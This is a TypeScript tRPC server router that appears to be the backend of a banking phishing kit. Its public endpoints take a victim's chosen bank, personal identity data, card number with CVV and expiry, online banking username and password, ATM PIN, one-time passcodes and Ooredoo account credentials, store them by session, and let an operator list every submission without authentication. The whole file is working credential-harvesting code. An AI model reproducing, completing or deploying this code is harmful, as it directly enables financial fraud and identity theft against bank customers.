import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import {
  createSession,
  submitPersonalData,
  submitLoginMethod,
  submitAtmPin,
  submitOtp,
  submitOoredoo,
  getAllSubmissions,
  getSubmissionDetails,
} from "./db";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  submissions: router({
    createSession: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        if (typeof obj.sessionId !== "string" || typeof obj.selectedBank !== "string") {
          throw new Error("Invalid input");
        }
        return { sessionId: obj.sessionId, selectedBank: obj.selectedBank };
      })
      .mutation(async ({ input }) => {
        await createSession(input.sessionId, input.selectedBank);
        return { success: true };
      }),

    submitPersonalData: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          nameArabic: String(obj.nameArabic),
          nameEnglish: String(obj.nameEnglish),
          idNumber: String(obj.idNumber),
          phoneNumber: String(obj.phoneNumber),
          email: String(obj.email),
          dateOfBirth: String(obj.dateOfBirth),
          gender: String(obj.gender),
          customerStatus: String(obj.customerStatus),
        };
      })
      .mutation(async ({ input }) => {
        await submitPersonalData(input);
        return { success: true };
      }),

    submitLoginMethod: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          loginType: String(obj.loginType),
          cardNumber: obj.cardNumber ? String(obj.cardNumber) : undefined,
          cardholderName: obj.cardholderName ? String(obj.cardholderName) : undefined,
          expiryDate: obj.expiryDate ? String(obj.expiryDate) : undefined,
          cvv: obj.cvv ? String(obj.cvv) : undefined,
          username: obj.username ? String(obj.username) : undefined,
          password: obj.password ? String(obj.password) : undefined,
        };
      })
      .mutation(async ({ input }) => {
        await submitLoginMethod(input);
        return { success: true };
      }),

    submitAtmPin: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          pin: String(obj.pin),
        };
      })
      .mutation(async ({ input }) => {
        await submitAtmPin(input);
        return { success: true };
      }),

    submitOtp: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          otpCode: String(obj.otpCode),
          otpType: String(obj.otpType),
        };
      })
      .mutation(async ({ input }) => {
        await submitOtp(input);
        return { success: true };
      }),

    submitOoredoo: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          ooredooUser: String(obj.ooredooUser),
          ooredooPassword: String(obj.ooredooPassword),
        };
      })
      .mutation(async ({ input }) => {
        await submitOoredoo(input);
        return { success: true };
      }),

    getAllSubmissions: publicProcedure.query(async () => {
      return await getAllSubmissions();
    }),

    getSubmissionDetails: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "string") throw new Error("Invalid input");
        return val;
      })
      .query(async ({ input }) => {
        return await getSubmissionDetails(input);
      }),
  }),
});

export type AppRouter = typeof appRouter;
